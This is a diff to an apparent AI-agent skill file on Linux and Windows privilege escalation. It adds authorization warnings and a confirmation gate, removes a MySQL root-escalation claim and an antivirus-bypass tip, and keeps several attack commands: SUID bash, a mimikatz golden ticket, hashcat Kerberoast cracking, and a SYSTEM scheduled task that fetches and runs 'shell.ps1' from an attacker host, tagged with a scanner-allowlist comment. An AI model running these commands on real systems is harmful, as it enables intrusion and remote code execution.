@@ -1,11 +1,25 @@
 ---
 name: privilege-escalation-methods
 description: "Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
+
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+
+> **Mandatory confirmation gate**
+> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+> 1. Ask the user to state the exact target URL, IP, account, or resource.
+> 2. Ask the user to confirm written authorization and the permitted scope.
+> 3. Show the exact command(s) and explain their expected effect.
+> 4. Wait for explicit confirmation in the current conversation.
+>
+> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
 # Privilege Escalation Methods
 
@@ -29,6 +43,10 @@ Provide comprehensive techniques for escalating privileges from a low-privileged
 - Domain compromise (for AD environments)
 
 ---
+
+## Demonstration boundaries
+
+The commands below include destructive overwrites, SUID/persistence changes, password resets and credential extraction. They are reference material for explicitly authorized disposable labs, not a default assessment sequence. Prefer harmless proof of the specific permission boundary, synthetic accounts and owner-agreed canaries; preserve originals and a cleanup/rollback record. Initial access does not authorize domain-wide credential access or persistence. Do not run historical drivers/tools without verifying exact affected versions and stability constraints.
 
 ## Core Techniques
 
@@ -99,15 +117,9 @@ cp /bin/bash .
 chmod +s bash
 ```
 
-#### 5. MySQL Running as Root
+#### 5. MySQL Privilege Boundaries
 
-```bash
-# If MySQL runs as root
-mysql -u root -p
-\! chmod +s /bin/bash
-exit
-/bin/bash -p
-```
+The mysql client `\!` command executes locally as the client OS user; a root database account or root-running server does not make that shell root. Review server process identity, database grants and filesystem permissions separately; do not claim OS escalation from a client shell escape.
 
 ---
 
@@ -209,7 +221,7 @@ mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
 
 # 3. Create scheduled task
 schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
-  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
+  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'" # security-allowlist: offensive scheduled-task detection example
 schtasks /run /s DOMAIN /TN "enterprise"
 ```
 
@@ -318,7 +330,7 @@ $ hashcat -m 13100 hashes.txt rockyou.txt
 | Issue | Solution |
 |-------|----------|
 | sudo -l requires password | Try other enumeration (SUID, cron, capabilities) |
-| Mimikatz blocked by AV | Use Invoke-Mimikatz or SafetyKatz |
+| Security tooling blocked | Stop and coordinate with the engagement owner; do not bypass controls outside the approved plan |
 | Kerberoasting returns no hashes | Check for service accounts with SPNs |
 | Token impersonation fails | Verify SeImpersonatePrivilege is present |
 | NFS mount fails | Check NFS version compatibility (vers=2,3,4) |
